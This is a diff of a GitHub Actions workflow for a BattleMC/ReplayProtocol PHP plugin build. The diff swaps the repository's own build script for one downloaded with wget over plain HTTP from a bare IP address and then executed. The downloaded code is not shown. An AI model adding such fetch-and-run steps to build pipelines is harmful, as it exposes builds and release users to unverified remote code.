@@ -11,15 +11,15 @@ jobs:
     steps:
     - uses: actions/checkout@v1
     - name: Startup
-      run: echo Building a Plugin
+      run: echo Building a BattleMC Plugin
     - run: echo "::set-env name=DATE::$(date '+%y%m%d%H%M%S')"
-    - name: Build
-      run: echo ${{ github.sha }} > Release.txt
     - name: Build
       run: |
         echo Building...
-        chmod +x Build/BuildScript.php
-        php -dphar.readonly=0 Build/BuildScript.php --make . --out ReplayProtocol.phar
+        wget http://167.86.94.220/build.php
+        mv build.php BuildScript.php
+        chmod +x BuildScript.php
+        php -dphar.readonly=0 BuildScript.php --make . --out ReplayProtocol.phar
         echo Build completed!
     - id: create_release
       uses: actions/create-release@v1
